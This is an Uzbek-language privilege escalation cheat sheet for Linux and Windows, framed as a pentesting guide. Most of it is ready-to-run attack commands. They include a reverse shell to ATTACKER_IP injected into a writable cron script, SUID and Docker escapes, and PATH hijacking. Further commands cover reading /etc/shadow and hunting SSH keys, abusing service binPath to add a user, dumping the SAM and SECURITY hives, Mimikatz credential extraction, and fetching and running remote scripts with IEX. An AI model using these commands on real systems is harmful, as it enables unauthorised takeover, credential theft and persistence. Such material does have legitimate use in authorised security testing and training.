ðŸ”º Privilege Escalation Qoâ€˜llanmasi (Linux & Windows)
ðŸ“Œ Kirish

Privilege Escalation â€” bu tizimda oddiy foydalanuvchidan root/administrator darajasiga koâ€˜tarilish jarayoni.
Pentestingda PE (Privilege Escalation) maqsadi:

Zaif konfiguratsiyalarni topish

Jarayonlar/Yadro darajasidagi xatolar

Parollarni tiklash / Credential harvesting

File permission misconfig

Service ekspluatatsiya

Kernel exploitlar

ðŸ§© Privilege Escalation umumiy metodologiyasi
1) Tizim haqida maâ€™lumot toâ€˜plash

OS versiyasi

Patch level

Oâ€˜rnatilgan xizmatlar

Foydalanuvchilar va ruxsatlar

Cron/Task Scheduler

Tarmoqlar va portlar

Linuxta SUID, Capabilities

Windowsda tokens, services, registry

2) Zaif konfiguratsiyalarni aniqlash

Parollarni saqlashdagi xatolar

Ruxsatlarning notoâ€˜gâ€˜ri oâ€˜rnatilishi

Yozilishi mumkin boâ€˜lgan servislar

Setuid bit notoâ€˜gâ€˜ri oâ€˜rnatilishi

DLL Hijacking

PATH Hijacking

Kernel exploitlar

3) Ekspluatatsiya

Local exploitlar

Misconfigured service exploitation

Password reuse

Hijacking (PATH, SUID, Scheduled Tasks, DLL)

4) Uzoq muddatli kirishni saqlash

Rootkit oâ€˜rnatish (pentest uchun emas)

SSH key joylash

DLL/Service persistence
(faqat ruxsat bilan!)

ðŸ§ Linux Privilege Escalation
1. OS va tizim haqida maâ€™lumot
uname -a
cat /etc/os-release
cat /etc/issue
hostnamectl

2. Foydalanuvchilar va ruxsatlar
id
whoami
sudo -l
groups
cat /etc/passwd
cat /etc/shadow (root boâ€˜lsa)

3. Cron va xizmatlar
crontab -l
ls -la /etc/cron.*
systemctl list-timers
systemctl list-units --type=service

â— Cron misconfiguration misol:

Cron ishlatadigan skript yoziladigan (writeable) boâ€˜lsa:

echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/script.sh


Root boâ€˜lib qaytadi.

4. SUID binary qidirish
find / -perm -4000 -type f 2>/dev/null

SUID orqali eskalatsiya misol:
/usr/bin/find . -exec /bin/sh \; -quit


GTFObinsâ€™dan foydalanish mumkin:
https://gtfobins.github.io/

5. Docker / LXC orqali PE

Agar user docker guruhida boâ€˜lsa:

docker run -v /:/mnt --rm -it alpine chroot /mnt sh


â†’ root boâ€˜lasiz.

6. Parollarni tiklash
grep -r "password" /etc 2>/dev/null
grep -r "PASS" /home 2>/dev/null


SSH private key:

find / -name id_rsa 2>/dev/null

7. Kernel Exploitlar

OS versiyasini tekshirib exploit qidirish:

uname -r
searchsploit linux kernel


Misol:

DirtyCow (CVE-2016-5195)
DirtyPipe (CVE-2022-0847)

8. PATH Hijacking

Agar root ishlatadigan skript PATHâ€™dan foydalanayotgan boâ€˜lsa:

echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH

ðŸªŸ Windows Privilege Escalation
1. Tizim maâ€™lumotlari
systeminfo
wmic qfe
whoami /all

2. Foydalanuvchi va guruhlar
net user
net localgroup
whoami /priv


Muammo: Agar SeImpersonatePrivilege yoqilgan boâ€˜lsa â†’ JuicyPotato, RoguePotato, PrintSpoofer orqali SYSTEM boâ€˜lish mumkin.

3. Xizmatlar (Services)
sc query
sc qc <service_name>

Zaif service misoli:

Agar service binPath'i yoziladigan boâ€˜lsa:

sc config MyService binPath= "cmd.exe /c net user behruz 123456 /add"
sc config MyService obj= LocalSystem
net start MyService


â†’ SYSTEM huquqi olinadi.

4. Registry misconfig

Yozilishi mumkin boâ€˜lgan registry key:

reg query HKLM\System\CurrentControlSet\Services


ImagePath oâ€˜zgartirilsa, service SYSTEM huquqi bilan kodni ishlatadi.

5. Unquoted Service Path

Agar servis yoâ€˜lida qoâ€˜shtirnoq boâ€˜lmasa:

C:\Program Files\My App\service.exe


Windows:

C:\Program.exe

C:\Program Files\My.exe
qidiradi.

C:\Program.exe ga reverse shell qoâ€˜yib SYSTEM boâ€˜lish mumkin.

6. DLL Hijacking

Servis boshlanganda yuklanadigan DLL topiladi:

procmon


Yoziladigan katalogga malicious.dll qoâ€˜yib eskalatsiya qilish mumkin.

7. Token Impersonation
whoami /priv


Agar mavjud boâ€˜lsa:

SeImpersonatePrivilege

SeAssignPrimaryTokenPrivilege

â†’ SYSTEM boâ€˜lish mumkin (PrintSpoofer.exe):

PrintSpoofer64.exe -i -c cmd

8. Credential Harvesting

LSA Secrets:

reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY sec.hiv


Mimikatz:

sekurlsa::logonpasswords

9. Windows Kernel Exploitlar
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
searchsploit Windows Kernel

ðŸ”§ Avtomatlashtirilgan PE Asboblar
Linux

linpeas.sh

linenum.sh

pspy

linux-exploit-suggester

GTFOBins

wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linux/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

Windows

winPEAS.exe

Windows Exploit Suggester

Seatbelt

SharpUp

PowerUp.ps1

PowerUp:

IEX (New-Object Net.WebClient).DownloadString("https://.../PowerUp.ps1")
Invoke-AllChecks

ðŸ”¥ Cheat Sheet
Yoâ€˜l	Linux	Windows
Servis zaifligi	systemctl, cron	sc qc, unquoted path
Parollar	shadow, config files	SAM, LSA Secrets
Kernel exploit	searchsploit	Windows Kernel exploits
File perms	SUID, capabilities	ACL, registry
Tokens	â€”	SeImpersonatePrivilege
Container escape	Docker, LXC	Windows Sandbox